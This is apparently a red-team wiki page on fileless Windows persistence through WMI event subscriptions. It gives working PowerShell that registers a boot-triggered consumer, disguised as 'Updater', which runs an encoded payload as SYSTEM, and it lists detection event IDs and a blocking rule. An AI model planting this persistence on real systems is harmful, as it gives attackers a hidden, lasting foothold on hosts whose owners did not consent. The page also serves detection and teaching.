---
title: WMI Event Subscription Persistence
slug: wmi-event-subscription-persistence
---

> **TL;DR:** Register an `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` triplet in `root\subscription` — a fileless trigger that runs your payload as SYSTEM whenever the WQL condition fires, and survives reboots.

## What it is
A persistence primitive that lives entirely inside the WMI repository (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`). The WMI service (`Winmgmt`) continually evaluates registered WQL filters; when one matches, the bound consumer executes — typically `CommandLineEventConsumer` for arbitrary command lines or `ActiveScriptEventConsumer` for inline VBScript/JScript. No file on disk, no scheduled task, no registry Run key.

## Preconditions / where it applies
- Local administrator (writing to `root\subscription` requires elevation)
- WMI service running (default on every Windows host)
- Works domain-wide via `Set-WmiInstance -ComputerName` for lateral persistence

## Technique
Build the three objects and bind them. The filter below fires ~200 seconds after boot using `Win32_PerfFormattedData_PerfOS_System.SystemUpTime`, a classic trigger that survives reboot without needing a logon session.

```powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name='Updater'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200"}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name='Updater'; CommandLineTemplate='C:\Windows\System32\cmd.exe /c powershell -enc <b64>'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

Hunt with `Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding` on suspect hosts; legitimate bindings are rare outside SCCM/Defender ATP.

## Detection and defence
- `Microsoft-Windows-WMI-Activity/Operational` EIDs **5860**, **5861** log permanent subscription creation
- Sysmon EIDs **19** (filter), **20** (consumer), **21** (binding) — high-fidelity, low-volume
- Defender ASR rule `e6db77e5-3df2-4cf1-b95a-636979351e5b` blocks persistence via WMI subscription

## References
- [ired.team — Abusing Windows Management Instrumentation](https://www.ired.team/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation) — original walkthrough
- [MITRE ATT&CK T1546.003](https://attack.mitre.org/techniques/T1546/003/) — WMI Event Subscription
